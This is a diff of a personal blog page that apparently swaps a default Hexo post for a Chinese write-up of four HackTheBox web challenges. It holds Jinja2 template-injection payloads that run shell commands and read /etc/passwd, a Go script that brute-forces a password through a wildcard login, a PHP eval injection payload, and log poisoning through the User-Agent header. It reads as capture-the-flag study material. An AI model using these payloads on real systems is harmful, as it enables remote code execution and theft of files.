@@ -9,7 +9,7 @@
     
     <title>
         
-            Hello World |
+            HTB Challenges—Web |
         
         n3ym4r&#39;s blog
     </title>
@@ -173,7 +173,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">Hello World</span>
+            <span class="title-hover-animation">HTB Challenges—Web</span>
         </div>
 
         
@@ -193,27 +193,46 @@
         
             <i class="fa-regular fa-calendar-plus"></i>&nbsp;
         
-        <span class="pc">2022-10-15 22:14:09</span>
-        <span class="mobile">2022-10-15 22:14</span>
+        <span class="pc">2023-02-04 16:06:14</span>
+        <span class="mobile">2023-02-04 16:06</span>
     </span>
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2022-10-15 22:14:09</span>
+        <span class="pc">2023-02-04 16:07:48</span>
     </span>
     
     
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%89%93%E9%9D%B6/">打靶</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Web/">Web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>75 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.5k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>7 分钟</span>
         </span>
     
     
@@ -225,19 +244,212 @@
         
 
         <div class="article-content markdown-body">
-            <p>Welcome to <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
+            <h3 id="Templated"><a href="#Templated" class="headerlink" title="Templated"></a>Templated</h3><p>打开页面，有提示说是Flask&#x2F;jinja2框架搭建，以及靶机标题templated判断为ssti模板注入</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/1.4im6z91nvm2o.webp" alt="1"></p>
+<p>输入9测试</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/2.301jhwgrxf40.webp" alt="2"></p>
+<p>回显9，确定为ssti模板注入</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/1.4im6z91nvm2o.webp" alt="1"></p>
+<pre><code class="shell">http://178.128.171.82:31589/&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__=='_IterationGuard' %&#125;
+&#123;&#123; c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls ').read()") &#125;&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
 </code></pre>
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/3.1ni76dx1e7xc.webp" alt="3"></p>
+<p>回显了目录列表，查看flag.txt</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.gur26w0x2js.webp" alt="图片"></p>
+<p>拿到flag</p>
+<p>这里是典型的python-Flask模板注入，一些基础payload：</p>
+<pre><code class="python">获得基类
+#python2.7
+&#39;&#39;.__class__.__mro__[2]
+&#123;&#125;.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+request.__class__.__mro__[1]
+#python3.7
+&#39;&#39;.__。。。class__.__mro__[1]
+&#123;&#125;.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+request.__class__.__mro__[1]
+
+#python 2.7
+#文件操作
+#找到file类
+[].__class__.__bases__[0].__subclasses__()[40]
+#读文件
+[].__class__.__bases__[0].__subclasses__()[40](&#39;/etc/passwd&#39;).read()
+#写文件
+[].__class__.__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)
+
+#命令执行
+#os执行
+[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
+[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()
+#eval,impoer等全局函数
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()
+
+#python3.7
+#命令执行
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+#文件操作
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+#windows下的os命令
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).r
 </code></pre>
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
+<h3 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a>Phonebook</h3><p>打开页面是一个登录框</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.4si1jfuhpd6o.webp" alt="图片"></p>
+<p>看到登录框，第一反应为sql注入，试一下万能密码<code>admin&#39; or &#39;1&#39;=&#39;1</code>不行，然后fuzz一下，看有没有SQL注入，没有成功。</p>
+<p>尝试通配符登录，用户名密码都填*，登录成功</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.uq9cf5sfjqo.webp" alt="图片"></p>
+<p>是一个查询用户电话号码的搜索页面，到处瞅瞅页面没啥问题</p>
+<p>问题回到那个登录框，将用户名改为页面下留言的Reese，密码为*，登录成功</p>
+<p>将用户名改成其他，密码为*，无法登录</p>
+<p>也就是说登录用户名确定为Reese，猜测密码即为flag，flag格式为HTB{}，将密码改为H*，发现登录成功，说明猜测没错接下来就是写个脚本爆破出flag值。脚本原理即为一位一位遍历，后面加上一个通配符，前面一位是对的时，会登录成功，否则登录失败。</p>
+<p>go脚本如下：</p>
+<pre><code class="go">package main
+
+import (
+    &quot;bytes&quot;
+    &quot;fmt&quot;
+    &quot;io/ioutil&quot;
+    &quot;net/http&quot;
+    &quot;strings&quot;
+)
+
+func main() &#123;
+    url := &quot;http://144.126.228.187:30674/login&quot;
+    client := &amp;http.Client&#123;&#125;
+    chars := &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.?!_&#125;&quot;
+    flag := &quot;HTB&#123;&quot;
+    password := &quot;&quot;
+    for i := 0; i &lt; len(chars); i++ &#123;
+        password = flag + string(chars[i]) + &quot;*&quot;
+        fmt.Printf(&quot;[-] testing %s&quot;, password)
+        data := []byte(&quot;username=Reese&amp;password=&quot; + password)
+        req, _ := http.NewRequest(&quot;POST&quot;, url, bytes.NewBuffer(data))
+        req.Header.Add(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;)
+        req.Header.Add(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;)
+        resp, err := client.Do(req)
+        if err != nil &#123;
+            fmt.Println(&quot;Error:&quot;, err)
+        &#125;
+        defer resp.Body.Close()
+
+        if resp.StatusCode == 200 &#123;
+            bodyBytes, _ := ioutil.ReadAll(resp.Body)
+            bodyString := string(bodyBytes)
+
+            if strings.Contains(bodyString, &quot;No search results&quot;) &#123;
+                flag += string(chars[i])
+                fmt.Println(&quot; success&quot;)
+                fmt.Printf(&quot;[+] %s\n&quot;, flag)
+                break
+            &#125;
+        &#125;
+        fmt.Println(&quot; failed&quot;)
+
+        if flag[len(flag)-1] == &#39;&#125;&#39; &#123;
+            break
+        &#125;
+    &#125;
+
+    fmt.Printf(&quot;flag: %s\n&quot;, flag)
+&#125;
 </code></pre>
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
+<h3 id="LoveTok"><a href="#LoveTok" class="headerlink" title="LoveTok"></a>LoveTok</h3><p>题目给了源码，下载下来查看</p>
+<p>打开页面，点击最底下的按钮出现format参数，猜测这个参数有利用点，去源码中找到此参数</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.1lryxa0xyr9c.webp" alt="图片"></p>
+<p>在TimeModel.php中找到了$format</p>
+<pre><code class="php">&lt;?php
+class TimeModel
+&#123;
+    public function __construct($format)
+    &#123;
+        $this-&gt;format = addslashes($format);
+
+        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
+        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;
+    &#125;
+
+    public function getTime()
+    &#123;
+        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);
+        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;
+    &#125;
+&#125;
 </code></pre>
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里用了addslashes()——– 使用反斜线引用字符串</p>
+<p>注意下面有个eval()函数，将$this-&gt;format包含在了里面，也就意味着，我们可以控制format的值来进行eval()执行代码。</p>
+<p>所以，第一步绕过addslashes()的转义</p>
+<p>使用php复杂变量进行绕过</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.programmersought.com/article/30723400042/" >https://www.programmersought.com/article/30723400042/<i class="fas fa-external-link-alt"></i></a></p>
+<p>简单来说，${phpinfo()}，会先执行phpinfo(),然后将返回值作为变量名</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.nuivar33scw.webp" alt="图片"></p>
+<p>这里“还是会被转义，所以需要换个方式，不使用到这些字符</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.1ugzjeexni68.webp" alt="图片"></p>
+<pre><code>?format=$&#123;system($_GET[1])&#125;&amp;1=ls
+</code></pre>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.46cs2jdwnw5c.webp" alt="图片"></p>
+<pre><code>?format=$&#123;system($_GET[1])&#125;&amp;1=ls /
+</code></pre>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.2w67qo8eijeo.webp" alt="图片"></p>
+<pre><code>?format=$&#123;system($_GET[1])&#125;&amp;1=cat /flagLpfG2
+</code></pre>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/202323/%E5%9B%BE%E7%89%87.4p3nh0peeo74.webp" alt="图片"></p>
+<p>拿到flag，这就是一道php命令执行的题。</p>
+<h3 id="Toxic"><a href="#Toxic" class="headerlink" title="Toxic"></a>Toxic</h3><p>给了源码</p>
+<pre><code class="php">&lt;?php
+spl_autoload_register(function ($name)&#123;
+    if (preg_match(&#39;/Model$/&#39;, $name))
+    &#123;
+        $name = &quot;models/$&#123;name&#125;&quot;;
+    &#125;
+    include_once &quot;$&#123;name&#125;.php&quot;;
+&#125;);
+
+if (empty($_COOKIE[&#39;PHPSESSID&#39;]))
+&#123;
+    $page = new PageModel;
+    $page-&gt;file = &#39;/www/index.html&#39;;
+
+    setcookie(
+        &#39;PHPSESSID&#39;, 
+        base64_encode(serialize($page)), 
+        time()+60*60*24, 
+        &#39;/&#39;
+    );
+&#125; 
+
+$cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);
+unserialize($cookie);
+</code></pre>
+<p>这里可以看到，cookie是文件读取目录经过序列化之后再进行base64编码后生成的</p>
+<p>抓个包</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.3xz33hpf17s0.webp" alt="image"></p>
+<p>decode</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.411nsshh24s0.webp" alt="image"></p>
+<p>所以我们可以逆向去读取敏感文件</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.1l1z4err9l40.webp" alt="image"></p>
+<p>成功读取</p>
+<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230204155032598.png" alt="image-20230204155032598"></p>
+<p>注意到最后一行，nginx，想到日志文件包含</p>
+<p>nginx的log在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log，其中access.log可以打开。</p>
+<p>尝试读一下</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.64rtjiwmtp8.webp" alt="image"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.3mb8h84nni00.webp" alt="image"></p>
+<p>可以看到日志文件为请求头文件</p>
+<p>那么我们可以将请求头中的User-Agent字段更改为恶意代码，这样就会自动写入日志文件中，然后被执行。</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.rrtipquzvio.webp" alt="image"></p>
+<p>再次访问日志文件，之前更改了ua的访问已经被记录</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.6z1mt4n561c0.webp" alt="image"></p>
+<p>php代码也已经被执行，回显了flag</p>
 
         </div>
 
@@ -245,11 +457,11 @@
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul class="copyright-info-content">
-        <li>本文标题：Hello World</li>
+        <li>本文标题：HTB Challenges—Web</li>
         <li>本文作者：n3ym4r</li>
-        <li>创建时间：2022-10-15 22:14:09</li>
+        <li>创建时间：2023-02-04 16:06:14</li>
         <li>
-            本文链接：https://n3ym4r.github.io/2022/10/15/hello-world/
+            本文链接：https://n3ym4r.github.io/2023/02/04/HTB Challenges—Web/
         </li>
         <li>
             版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -261,33 +473,34 @@
         
 
         
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%89%93%E9%9D%B6/">#打靶</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/HTB/">#HTB</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Web/">#Web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
         
             <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2023/01/31/Ambassador%E9%9D%B6%E6%9C%BA/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">Ambassador靶机</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
                 
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2020/04/07/sql%E6%B3%A8%E5%85%A5/"
+                           href="/2023/02/03/Archetype%E9%9D%B6%E6%9C%BA/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">SQL注入学习笔记</span>
+                                <span class="post-nav-title-item">Archetype靶机</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -405,7 +618,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Templated"><span class="nav-text">Templated</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phonebook"><span class="nav-text">Phonebook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LoveTok"><span class="nav-text">LoveTok</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Toxic"><span class="nav-text">Toxic</span></a></li></ol>
     </div>
 </div>
         </aside>
